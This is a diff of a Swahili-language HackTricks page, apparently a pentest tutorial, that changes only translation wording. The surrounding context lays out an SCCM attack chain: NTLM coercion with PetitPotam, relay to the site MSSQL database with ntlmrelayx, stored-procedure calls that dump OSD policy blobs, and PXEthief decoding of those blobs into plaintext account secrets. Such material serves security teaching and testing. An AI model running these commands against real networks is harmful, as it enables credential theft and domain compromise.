@@ -3,12 +3,12 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 ## TL;DR
-Kwa kulazimisha **System Center Configuration Manager (SCCM) Management Point (MP)** kuthibitisha kupitia SMB/RPC na **kupeleka** akaunti ya mashine ya NTLM kwa **hifadhidata ya tovuti (MSSQL)** unapata haki za `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Hizi ni nafasi zinazokuruhusu kuita seti ya taratibu zilizohifadhiwa zinazofichua **Operating System Deployment (OSD)** blobs (akili za Akaunti ya Upataji wa Mtandao, mabadiliko ya Task-Sequence, nk.). Blobs zimeandikwa kwa hex/zimelindwa lakini zinaweza kufichuliwa na kufichuliwa kwa kutumia **PXEthief**, zikitoa siri za maandiko.
+Kwa kulazimisha **System Center Configuration Manager (SCCM) Management Point (MP)** kuthibitisha kupitia SMB/RPC na **kupeleka** akaunti ya mashine ya NTLM kwa **hifadhidata ya tovuti (MSSQL)** unapata haki za `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Hizi ni nafasi zinazokuruhusu kuita seti ya taratibu zilizohifadhiwa zinazofichua **Operating System Deployment (OSD)** blobs (akili za Akaunti ya Upataji wa Mtandao, mabadiliko ya Mchakato, nk.). Blobs zimeandikwa kwa hex/encrypted lakini zinaweza kufichuliwa na kufichuliwa kwa **PXEthief**, zikitoa siri za maandiko.
 
 Mnyororo wa kiwango cha juu:
 1. Gundua MP & hifadhidata ya tovuti ↦ mwisho wa HTTP usio na uthibitisho `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
 2. Anza `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
-3. Lazimisha MP kwa kutumia **PetitPotam**, PrinterBug, DFSCoerce, nk.
+3. Lazimisha MP ukitumia **PetitPotam**, PrinterBug, DFSCoerce, nk.
 4. Kupitia proxy ya SOCKS ungana na `mssqlclient.py -windows-auth` kama akaunti ya **<DOMAIN>\\<MP-host>$** iliyopelekwa.
 5. Tekeleza:
 * `use CM_<SiteCode>`
@@ -25,11 +25,11 @@ Kiendelezi cha MP ISAPI **GetAuth.dll** kinatoa vigezo kadhaa ambavyo havihitaji
 
 | Parameter | Purpose |
 |-----------|---------|
-| `MPKEYINFORMATIONMEDIA` | Inarudisha funguo ya umma ya cheti cha kusaini tovuti + GUIDs za vifaa vya *x86* / *x64* **All Unknown Computers**. |
+| `MPKEYINFORMATIONMEDIA` | Inarudisha funguo ya umma ya cheti cha kusaini tovuti + GUIDs za vifaa vyote vya *x86* / *x64* **All Unknown Computers**. |
 | `MPLIST` | Inataja kila Management-Point katika tovuti. |
 | `SITESIGNCERT` | Inarudisha cheti cha kusaini cha Tovuti Kuu (tambua seva ya tovuti bila LDAP). |
 
-Chukua GUIDs ambazo zitakuwa kama **clientID** kwa maswali ya DB baadaye:
+Pata GUIDs ambazo zitakuwa kama **clientID** kwa maswali ya DB baadaye:
 ```bash
 curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
 ```
@@ -56,7 +56,7 @@ Unganisha kupitia proxy ya SOCKS (port 1080 kwa chaguo-msingi):
 ```bash
 proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
 ```
-Switch to the **CM_<SiteCode>** DB (tumia msimbo wa tovuti wa tarakimu 3, mfano `CM_001`).
+Switch to the **CM_<SiteCode>** DB (tumia msimbo wa tovuti wa tarakimu 3, e.g. `CM_001`).
 
 ### 3.1  Tafuta GUIDs za Kompyuta zisizojulikana (hiari)
 ```sql
@@ -77,15 +77,15 @@ Zingatia sera:
 * **CollectionSettings** – Inaweza kuwa na akaunti za run-as
 
 ### 3.3  Pata mwili kamili
-Ikiwa tayari una `PolicyID` & `PolicyVersion` unaweza kupuuzilia mbali hitaji la clientID kwa kutumia:
+Ikiwa tayari una `PolicyID` & `PolicyVersion` unaweza kupuuza hitaji la clientID kwa kutumia:
 ```sql
 EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
 ```
-> MUHIMU: Katika SSMS ongeza "Makarakteri Max yaliyopatikana" (>65535) au blob itakatwa.
+> MUHIMU: Katika SSMS ongeza "Idadi ya Wahusika Waliorejeshwa" (>65535) au blob itakatwa.
 
 ---
 
-## 4. Fanya dekodi na ufichue blob
+## 4. Fanya ufafanuzi na ufichuaji wa blob
 ```bash
 # Remove the UTF-16 BOM, convert from hex → XML
 echo 'fffe3c003f0078…' | xxd -r -p > policy.xml
@@ -115,7 +115,7 @@ Majukumu haya yanaonyesha idadi kubwa ya ruhusa za EXEC, zile muhimu zinazotumik
 | `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Rudisha mwili kamili wa sera. |
 | `MP_GetListOfMPsInSiteOSD` | Iliyorejeshwa na njia ya `MPKEYINFORMATIONMEDIA`. |
 
-Unaweza kukagua orodha kamili na:
+Unaweza kuangalia orodha kamili na:
 ```sql
 SELECT pr.name
 FROM   sys.database_principals AS dp
